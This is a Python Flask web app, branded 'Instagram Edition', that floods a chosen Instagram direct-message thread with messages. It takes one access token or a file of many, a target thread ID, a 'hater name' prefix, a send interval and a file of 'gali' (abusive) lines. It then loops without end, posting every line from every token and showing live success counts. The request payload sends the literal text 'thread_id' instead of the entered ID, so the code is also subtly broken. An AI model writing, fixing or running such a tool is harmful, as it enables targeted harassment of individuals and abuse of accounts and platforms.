from flask import Flask, request, render_template_string, jsonify
import requests
from threading import Thread, Event
import time
import random
import string
from datetime import datetime
import json
import re

app = Flask(__name__)
app.debug = True

# Instagram-specific headers
headers = {
    'User-Agent': 'Instagram 219.0.0.12.117 Android',
    'Accept': '*/*',
    'Accept-Language': 'en-US',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'close',
    'Authorization': None  # Will be set with the access token
}

stop_events = {}
threads = {}
task_status = {}
task_stats = {}

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    task_status[task_id] = "Running"
    task_stats[task_id] = {
        "status": "Running",
        "start_time": datetime.now().strftime("%H:%M:%S"),
        "total_messages": 0,
        "successful_messages": 0,
        "failed_messages": 0,
        "last_message": "",
        "last_update": datetime.now().strftime("%H:%M:%S")
    }
    
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                if stop_event.is_set():
                    break
                    
                # Instagram Direct API endpoint
                api_url = 'https://i.instagram.com/api/v1/direct_v2/threads/broadcast/text/'
                
                # Prepare the message
                message = str(mn) + ' ' + message1
                
                # Instagram-specific parameters
                headers['Authorization'] = f'Bearer {access_token}'
                
                # Instagram requires a specific format for the request
                data = {
                    'thread_ids': f'[{"thread_id"}]',
                    'text': message,
                    'action': 'send_item'
                }
                
                try:
                    response = requests.post(api_url, data=data, headers=headers)
                    task_stats[task_id]['total_messages'] += 1
                    
                    if response.status_code == 200:
                        task_stats[task_id]['successful_messages'] += 1
                        print(f"Message Sent Successfully From token {access_token}: {message}")
                    else:
                        task_stats[task_id]['failed_messages'] += 1
                        print(f"Message Sent Failed From token {access_token}: {message}")
                        
                    task_stats[task_id]['last_message'] = f"{message[:20]}..." if len(message) > 20 else message
                    task_stats[task_id]['last_update'] = datetime.now().strftime("%H:%M:%S")
                    
                except Exception as e:
                    task_stats[task_id]['failed_messages'] += 1
                    task_stats[task_id]['last_message'] = f"Error: {str(e)[:20]}..."
                    print(f"Error sending message: {str(e)}")
                
                time.sleep(time_interval)
    
    task_status[task_id] = "Stopped"
    task_stats[task_id]['status'] = "Stopped"
    task_stats[task_id]['end_time'] = datetime.now().strftime("%H:%M:%S")

@app.route('/', methods=['GET', 'POST'])
def send_message():
    stop_key = None
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')

        if token_option == 'single':
            access_tokens = [request.form.get('singleToken')]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))

        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        stop_key = task_id

    return render_template_string('''
    <!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>☠️❣️👇𝐍𝐀𝐒𝐈𝐈𝐑 𝐀𝐋𝐈𝐈 𝐊𝐈𝐈𝐍𝐆 👇❣️☠️</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
  <style>
    label { color: white; animation: fadeIn 1s; }
    .file { height: 30px; animation: bounce 2s infinite; }
    body {
      background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045);
      background-size: 400% 400%;
      animation: gradientBG 15s ease infinite;
      color: white;
      animation: fadeIn 2s;
    }
    .container {
      max-width: 350px; 
      height: auto;
      border-radius: 20px;
      padding: 20px;
      box-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
      animation: zoomIn 2s;
      background: rgba(0, 0, 0, 0.6);
      backdrop-filter: blur(10px);
    }
    .form-control {
      outline: 1px red;
      border: 1px double white;
      background: rgba(255, 255, 255, 0.1);
      width: 100%;
      height: 40px;
      padding: 7px;
      margin-bottom: 20px;
      border-radius: 10px;
      color: white;
      animation: slideInLeft 1s;
    }
    .header { 
      text-align: center; 
      padding-bottom: 20px; 
      animation: bounceInDown 2s;
    }
    .btn-submit { 
      width: 100%; 
      margin-top: 10px;
      animation: pulse 2s infinite;
      background: linear-gradient(45deg, #833ab4, #fd1d1d);
      border: none;
    }
    .btn-stop { 
      width: 100%; 
      margin-top: 10px;
      animation: pulse 2s infinite;
      background: linear-gradient(45deg, #ff0000, #ff8c00);
      border: none;
    }
    .footer { 
      text-align: center; 
      margin-top: 20px; 
      color: #888; 
      animation: fadeInUp 2s;
    }
    .instagram-link {
      display: inline-block;
      color: #e1306c;
      text-decoration: none;
      margin-top: 10px;
      animation: zoomInUp 2s;
    }
    .instagram-link i { margin-right: 5px; }
    .stop-key-box {
      text-align: center;
      background-color: rgba(0, 0, 0, 0.7);
      border: 2px solid white;
      color: #00ff00;
      font-weight: bold;
      padding: 20px;
      margin-top: 30px;
      border-radius: 15px;
      animation: bounceInDown 1.5s;
    }
    .mini-monitor {
      max-width: 350px;
      margin: 20px auto;
      background: rgba(0, 0, 0, 0.6);
      border-radius: 15px;
      padding: 15px;
      box-shadow: 0 0 10px rgba(225, 48, 108, 0.5);
      backdrop-filter: blur(5px);
    }
    .mini-task {
      background: rgba(255, 255, 255, 0.1);
      border-radius: 8px;
      padding: 10px;
      margin-bottom: 10px;
      border-left: 3px solid #e1306c;
      font-size: 12px;
    }
    .status-running {
      color: #00ff00;
      font-weight: bold;
      font-size: 11px;
    }
    .status-stopped {
      color: #ff0000;
      font-weight: bold;
      font-size: 11px;
    }
    .stats-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 5px;
      margin-top: 5px;
    }
    .stat-item {
      background: rgba(0, 0, 0, 0.3);
      padding: 3px;
      border-radius: 4px;
      text-align: center;
    }
    .monitor-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 10px;
      padding-bottom: 5px;
      border-bottom: 1px solid rgba(255, 255, 255, 0.2);
    }
    .refresh-btn {
      background: rgba(225, 48, 108, 0.3);
      border: none;
      color: white;
      padding: 2px 8px;
      border-radius: 10px;
      cursor: pointer;
      font-size: 11px;
    }

    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }

    @keyframes gradientBG {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    @keyframes bounce {
      0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
      40% { transform: translateY(-10px); }
      60% { transform: translateY(-5px); }
    }

    @keyframes zoomIn {
      from { transform: scale(0.5); opacity: 0; }
      to { transform: scale(1); opacity: 1; }
    }

    @keyframes slideInLeft {
      from { transform: translateX(-100%); }
      to { transform: translateX(0); }
    }

    @keyframes bounceInDown {
      from { transform: translateY(-2000px); opacity: 0; }
      to { transform: translateY(0); opacity: 1; }
    }

    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.05); }
      100% { transform: scale(1); }
    }

    @keyframes fadeInUp {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    @keyframes zoomInUp {
      from { opacity: 0; transform: translateY(200px) scale(0.7); }
      to { opacity: 1; transform: translateY(0) scale(1); }
    }
    
    @keyframes glow {
      from { text-shadow: 0 0 5px #fff, 0 0 10px #fff, 0 0 15px #e1306c, 0 0 20px #e1306c; }
      to { text-shadow: 0 0 10px #fff, 0 0 20px #fff, 0 0 30px #e1306c, 0 0 40px #e1306c; }
    }
    
    .glowing-text {
      animation: glow 1s ease-in-out infinite alternate;
      font-size: 16px;
    }
  </style>
</head>
<body>
  <header class="header mt-4">
    <h1 class="mt-3 glowing-text">☠️❤️ 👇𝐍𝐀𝐒𝐈𝐈𝐑 𝐀𝐋𝐈𝐈 𝐊𝐈𝐈𝐍𝐆 👇❤️☠️</h1>
    <p style="font-size: 14px; margin-top: -10px;">Instagram Edition</p>
  </header>
  <div class="container text-center">
    <form method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label for="tokenOption" class="form-label">Select Token Option</label>
        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
          <option value="single">Single Token</option>
          <option value="multiple">Token File</option>
        </select>
      </div>
      <div class="mb-3" id="singleTokenInput">
        <label for="singleToken" class="form-label">𝙀𝙉𝙏𝙀𝙍 𝙎𝙄𝙉𝙂𝙇𝙀 𝙏𝙊𝙆𝙀𝙉..⤵️</label>
        <input type="text" class="form-control" id="singleToken" name="singleToken">
      </div>
      <div class="mb-3" id="tokenFileInput" style="display: none;">
        <label for="tokenFile" class="form-label">Choose Token File</label>
        <input type="file" class="form-control" id="tokenFile" name="tokenFile">
      </div>
      <div class="mb-3">
        <label for="threadId" class="form-label">𝙀𝙉𝙏𝙀𝙍 𝙄𝙉𝙎𝙏𝘼𝙂𝙍𝘼𝙈 𝙏𝙃𝙍𝙀𝘼𝘿 𝙄𝘿...⤵️</label>
        <input type="text" class="form-control" id="threadId" name="threadId" required>
      </div>
      <div class="mb-3">
        <label for="kidx" class="form-label">𝙀𝙉𝙏𝙀𝙍 𝙃𝘼𝙏𝙀𝙍 𝙉𝘼𝙈𝙀...⤵️</label>
        <input type="text" class="form-control" id="kidx" name="kidx" required>
      </div>
      <div class="mb-3">
        <label for="time" class="form-label">𝙀𝙉𝙏𝙀𝙍 𝙎𝙋𝙀𝙀𝘿...⤵️ (seconds)</label>
        <input type="number" class="form-control" id="time" name="time" required>
      </div>
      <div class="mb-3">
        <label for="txtFile" class="form-label">𝙀𝙉𝙏𝙀𝙍 𝙂𝘼𝙇𝙄 𝙁𝙄𝙇𝙀..⤵️</label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
      </div>
      <button type="submit" class="btn btn-primary btn-submit">☠️ 𝙍𝙐𝙉𝙄𝙉𝙂 𝙎𝙀𝙍𝙑𝙀𝙍 ☠️</button>
    </form>
    {% if stop_key %}
    <div class="stop-key-box">
      YOUR STOP KEY:<br><span style="font-size: 22px;">{{ stop_key }}</span>
    </div>
    {% endif %}
    <form method="post" action="/stop">
      <div class="mb-3 mt-4">
        <label for="taskId" class="form-label">𝙀𝙉𝙏𝙀𝙍 𝙎𝙏𝙊𝙋 𝙆𝙀𝙔..⤵️</label>
        <input type="text" class="form-control" id="taskId" name="taskId" required>
      </div>
      <button type="submit" class="btn btn-danger btn-stop">❤️ 𝙎𝙏𝙊𝙋 𝙎𝙀𝙍𝙑𝙀𝙍 ❤️</button>
    </form>
  </div>
  
  <div class="mini-monitor" id="miniMonitor">
    <div class="monitor-header">
      <h5 class="glowing-text" style="margin: 0; font-size: 14px;">📊 LIVE STATS</h5>
      <button class="refresh-btn" onclick="updateMiniMonitoring()">
        <i class="fas fa-sync-alt"></i>
      </button>
    </div>
    <div id="miniTaskList">
      <p class="text-center" style="font-size: 11px; margin: 0;">No active tasks</p>
    </div>
  </div>
  
  <footer class="footer">
    <p>☠️❣️👇𝐍𝐀𝐒𝐈𝐈𝐑 𝐀𝐋𝐈𝐈 𝐊𝐈𝐈𝐍𝐆 👇❣️☠️</p>
    <p><a href="https://www.instagram.com" style="color: #e1306c; font-size: 12px;">Instagram Edition</a></p>
    <div class="mb-3">
      <a href="https://wa.me/+923292021191" class="instagram-link" style="font-size: 12px;">
        <i class="fab fa-instagram"></i>💫 𝙄𝙉𝙎𝙏𝘼𝙂𝙍𝘼𝙈 𝙑𝙀𝙍𝙎𝙄𝙊𝙉 💫
      </a>
    </div>
  </footer>
  
  <script>
    function toggleTokenInput() {
      var tokenOption = document.getElementById('tokenOption').value;
      if (tokenOption == 'single') {
        document.getElementById('singleTokenInput').style.display = 'block';
        document.getElementById('tokenFileInput').style.display = 'none';
      } else {
        document.getElementById('singleTokenInput').style.display = 'none';
        document.getElementById('tokenFileInput').style.display = 'block';
      }
    }
    
    // Function to update mini monitoring
    function updateMiniMonitoring() {
      fetch('/get_stats')
        .then(response => response.json())
        .then(data => {
          const miniTaskList = document.getElementById('miniTaskList');
          
          if (Object.keys(data).length === 0) {
            miniTaskList.innerHTML = '<p class="text-center" style="font-size: 11px; margin: 0;">No active tasks</p>';
            return;
          }
          
          let html = '';
          for (const [taskId, stats] of Object.entries(data)) {
            const statusClass = stats.status === 'Running' ? 'status-running' : 'status-stopped';
            const successRate = stats.total_messages > 0 
              ? Math.round((stats.successful_messages / stats.total_messages) * 100) 
              : 0;
              
            html += `
              <div class="mini-task">
                <div style="display: flex; justify-content: space-between;">
                  <span><strong>ID:</strong> ${taskId.substring(0, 4)}...</span>
                  <span class="${statusClass}">${stats.status}</span>
                </div>
                <div class="stats-grid">
                  <div class="stat-item">Total: ${stats.total_messages}</div>
                  <div class="stat-item">Success: ${stats.successful_messages}</div>
                  <div class="stat-item">Failed: ${stats.failed_messages}</div>
                  <div class="stat-item">Rate: ${successRate}%</div>
                </div>
                <div style="margin-top: 5px; font-size: 10px;">
                  <strong>Last:</strong> ${stats.last_message || 'None'}
                </div>
                <div style="font-size: 9px; color: #aaa; margin-top: 3px;">
                  Updated: ${stats.last_update}
                </div>
              </div>
            `;
          }
          
          miniTaskList.innerHTML = html;
        })
        .catch(error => {
          console.error('Error fetching stats:', error);
        });
    }
    
    // Update monitoring every 3 seconds
    setInterval(updateMiniMonitoring, 3000);
    
    // Initial update
    updateMiniMonitoring();
  </script>
</body>
</html>
''', stop_key=stop_key)

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f'Task with ID {task_id} has been stopped.'
    else:
        return f'No task found with ID {task_id}.'

@app.route('/get_stats')
def get_stats():
    return jsonify(task_stats)

if __name__ == '__main__':

    app.run(host='0.0.0.0', port=5000)
